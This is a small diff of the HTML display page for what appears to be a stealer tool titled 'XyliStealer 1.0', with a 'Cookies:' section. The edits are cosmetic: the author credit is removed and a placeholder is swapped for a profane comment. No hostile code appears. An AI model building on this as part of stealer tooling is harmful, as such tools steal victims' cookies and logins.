@@ -35,7 +35,7 @@ body {
 <body>
 <table width="535" border="1" align="center">
   <tr>
-    <td width="525"><div align="center"><span class="Style1">XyliStealer 1.0 - By Xylitol</span></div></td>
+    <td width="525"><div align="center"><span class="Style1">XyliStealer 1.0</span></div></td>
   </tr>
 </table>
 <p>&nbsp;</p>
@@ -54,7 +54,7 @@ Cookies:</p>
 <p>&nbsp;</p>
 <table width="535" border="1" align="center">
   <tr>
-    <td width="525"><div align="center"><span class="Style1">Blah !</span></div></td>
+    <td width="525"><div align="center"><span class="Style1">fuck this ugly design, seriously !</span></div></td>
   </tr>
 </table>
 </body>
@@ -86,7 +86,7 @@ Cookies:</p>
   <p>&nbsp;</p>
 <table width="535" border="1" align="center">
   <tr>
-    <td width="525"><div align="center"><span class="Style1">Blah !</span></div></td>
+    <td width="525"><div align="center"><span class="Style1">fuck this ugly design, seriously !</span></div></td>
   </tr>
 </table>
 </body>
